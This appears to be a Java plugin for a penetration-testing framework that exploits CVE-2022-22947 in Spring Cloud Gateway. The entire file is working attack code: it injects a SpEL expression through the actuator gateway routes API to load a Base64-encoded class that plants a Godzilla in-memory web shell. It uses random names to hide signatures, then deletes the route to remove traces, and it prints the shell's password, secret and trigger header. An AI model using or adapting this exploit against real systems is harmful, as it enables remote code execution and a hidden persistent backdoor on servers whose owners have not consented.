package plugins.vul.spring.cloud.gateway;

import me.gv7.woodpecker.requests.RawResponse;
import me.gv7.woodpecker.tools.misc.RandomUtil;
import org.apache.commons.io.IOUtils;
import me.gv7.woodpecker.plugin.*;
import util.BytesCodeGenerator;

import java.util.Arrays;
import java.util.Base64;
import java.util.Map;

public class CVE_2022_22947_InjectGodzillaShell_Exploit implements IExploit {
    private IPluginHelper helper;

    public CVE_2022_22947_InjectGodzillaShell_Exploit() {
        helper = CVE_2022_22947_Plugin.pluginHelper;
    }

    @Override
    public String getExploitTabCaption() {
        return "Inject Godzilla Shell(AES-BASE64)";
    }

    @Override
    public IArgsUsageBinder getExploitCustomArgs() {
        IArgsUsageBinder usageBinder = helper.createArgsUsageBinder();

        IArg pass = helper.createArg();
        pass.setName("pass");
        pass.setRequired(true);
        pass.setDefaultValue("pass");
        pass.setDescription("Godzilla pass");

        IArg secret = helper.createArg();
        secret.setName("secret");
        secret.setRequired(true);
        secret.setDefaultValue("secret");
        secret.setDescription("Godzilla secret");

        IArg headerNameArg = helper.createArg();
        headerNameArg.setName("headerName");
        headerNameArg.setRequired(true);
        headerNameArg.setDefaultValue("Authorization");
        headerNameArg.setDescription("header name");

        IArg headerValueArg = helper.createArg();
        headerValueArg.setName("headerValue");
        headerValueArg.setRequired(true);
        headerValueArg.setDefaultValue("header value");
        headerValueArg.setDescription("header value");

        usageBinder.setUsage("type=AES-BASE64\npass=pass\nsecret=secret\n");
        usageBinder.setArgsList(Arrays.asList(
                pass,secret,headerNameArg,headerValueArg));

        return usageBinder;
    }

    @Override
    public void doExploit(ITarget iTarget, Map<String, Object> args, IResultOutput iResultOutput) throws Throwable {
        boolean success = false;
        // 获取url
        String url = iTarget.getAddress();
        url = url.endsWith("/") ? url.substring(0,url.length()-1) : url;

        if (!url.endsWith("/gateway")){
            url = url + "/actuator/gateway";
        }

        String pass = (String) args.get("pass");
        String secret = (String) args.get("secret");
        String headerName = (String) args.get("headerName");
        String headerValue = (String) args.get("headerValue");

        // 注入函数返回值动态生成,方便隐藏特征以及判断是否注入成功
        // 此处只能为string,如果为int类型返回值rewrite path始终为0原因位置
        String rand = RandomUtil.getRandomString(5);
        String routeName = RandomUtil.getRandomString(5);
        String className = RandomUtil.getRandomString(5);
        String payload = Base64.getEncoder().encodeToString(
                BytesCodeGenerator.generateWebfluxInjectGodzillaBytes(
                        className,
                        pass,
                        secret,
                        headerName,
                        headerValue,
                        rand
                )
        );

        // 创建路由
        String body = String.format("{\"predicates\": [{\"name\": \"Path\", \"args\": {\"_genkey_0\": \"%s/**\"}}],\"filters\": [{\"name\": \"RewritePath\", \"args\": {\"_genkey_0\": \"#{T(org.springframework.cglib.core.ReflectUtils).defineClass('%s',T(org.springframework.util.Base64Utils).decodeFromString('%s'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}\", \"_genkey_1\": \"/${path}\"}}], \"uri\": \"http://example.com\"}",
                routeName, className, payload);
        RawResponse rawResponse = CVE_2022_22947_Plugin.createPocRoute(url,routeName,body);
        if (rawResponse.statusCode() != 201){
            iResultOutput.failPrintln("create route request send failed");
            return;
        } else {
            iResultOutput.successPrintln("create route request send successfully");
        }

        // 刷新路由
        rawResponse = CVE_2022_22947_Plugin.refreshRoute(url+"/refresh");
        if (rawResponse.statusCode() != 200){
            iResultOutput.failPrintln("refresh route failed");
        } else {
            iResultOutput.successPrintln("refresh route successfully");
        }

        // 探测路由
        rawResponse = CVE_2022_22947_Plugin.verifyRoute(String.format("%s/routes/%s",url,routeName));
        if (rawResponse.statusCode() != 200){
            iResultOutput.failPrintln("create route failed");
        } else {
            iResultOutput.successPrintln("create route successfully");
            if (new String(IOUtils.toByteArray(rawResponse.body())).contains(rand)){
                success = true;
            } else {
                success = false;
            }

            rawResponse = CVE_2022_22947_Plugin.deleteRoute(String.format("%s/routes/%s",url,routeName));
            if (rawResponse.statusCode() == 200){
                iResultOutput.successPrintln("delete route successfully");
            } else {
                iResultOutput.failPrintln("delete route failed");
            }

            if (success) {
                iResultOutput.successPrintln("inject memory shell successfully");
                iResultOutput.infoPrintln(String.format("password: %s", pass));
                iResultOutput.infoPrintln(String.format("secret:   %s", secret));
                iResultOutput.infoPrintln(String.format("header:   %s: %s", headerName,headerValue));
            } else {
                iResultOutput.failPrintln("inject memory shell failed");
            }
        }
    }
}
